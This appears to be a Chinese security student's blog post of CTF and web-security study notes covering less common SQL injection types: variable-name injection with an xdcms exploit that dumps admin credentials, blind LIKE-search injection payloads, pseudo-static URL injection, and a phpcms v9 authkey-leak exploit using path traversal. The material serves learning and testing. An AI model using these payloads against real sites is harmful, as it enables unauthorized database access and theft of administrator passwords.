---
layout:     post
title:      Web笔记（六）SQL注入之其他注入
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是补充常见数据库本身的注入以外的SQL注入。
date:       2020-11-29
author:     HouKC
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
---



## 0x01 变量名注入

有时候可能会在奇奇怪怪的地方可以注入，如post变量名可能出现如下，有点像字典一样的变量：

```http
POST / HTTP 1.0
...
...

fields[truename]=Bob
```

或者

```http
POST / HTTP 1.0
...
...

fields%5Btruename%5D=Bob
```

例如：xdcms某版本的修改会员资料处的姓名，就是这种注入漏洞，exp：

```
%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23

（url解码为：`=(select group_concat(username,0x3a,password) from c_admin where id=1)#）
```

把上面这一段放在fields%5Btruename%5D的%5D前面，也就是如下

```http
POST / HTTP 1.0
...
...

fields%5Btruename%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23%5D
```
自行解一下码方便看，如下：
```http
POST / HTTP 1.0
...
...

fields[truename`=(select group_concat(username,0x3a,password) from c_admin where id=1)#]
```
即可形成攻击。



## 0x02 搜索型注入

- like
- 通配符 \*
- sql通配符 %%
- select * from news where id='%like $id %'

```
# 判断是否存在搜索型输入
id=2%' and 1=1 and '%'='     返回和单独输入2是一样的页面
id=2%' and 1=2 and '%'='     返回不同

# 判断是数据库类型
id=2%' and(select count(\*) from mssysaccessobjects)>0 and '%'='  //返回正常，access数据库

# 判断表名是否存在
id=2%' and(select count(\*) from admin_user)>0 and '%'='       //返回正常，存在admin_user表

# 判断字段名是否存在
id=2%' and(select count(username) from admin_user)>0 and '%'='   //返回正常，存在username字段
id=2%' and(select count(passeword) from admin_user)>0 and '%'='  //返回正常，存在password字段

# 判断字段长度
id=2%' and(select top 1 len(username) from admin_user)>4 and '%'='   //返回正常，username长度大于4
id=2%' and(select top 1 len(username) from admin_user)=5 and '%'='  //返回正常，username长度等于5

# 判断具体数据的单个字符
id=2%' and(select top 1 asc(mid(password,1,1))from admin_user)=55 and '%'='  //返回正常，则对应位置的ascii编码是对的，否则错误
```



## 0x03 伪静态注入

```
http://xx.com/xx.php/index/ndetails/class/news/htmls/moving/id/1131.html
http://xx.com/xx.php/index/ndetails/class/news/htmls/moving/id/1131
```

注入点在上面1131后面，也就是html文件名，如下：

```
http://xx.com/xx.php/index/ndetails/class/news/htmls/moving/id/1131' and 1=1.html
```

常出现此注入的框架：

- aspcms
- phpweb
- thinkphp

还有其他类型的伪静态如：

```
http://xxx.com/x_detail_id_1234.html
```

在网站后台可能相当于

```
http://xxx/com/x/detail.php?id=1234
```



## 0x04 phpv9 authkey注入

利用exp爆出authkey

```
api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin
```

或者以下

```
/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=662dCAZSAwgFUlUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwIXRlgeERUHQVlIUVJAA0lRXABSQEwNXAhZVl5V
```

即在目标网站根目录下输入/phpsso...全部内容，然后看返回的结果中包含一段auth_key和http链接，将其填充到phpv9 auth_key.php中对应的位置去，然后搭建本地php网站环境，将该文件放在网站根目录下，然后访问本地该文件，对本地该文件访问进行注入即可，相当于本地该文件作为中间人。

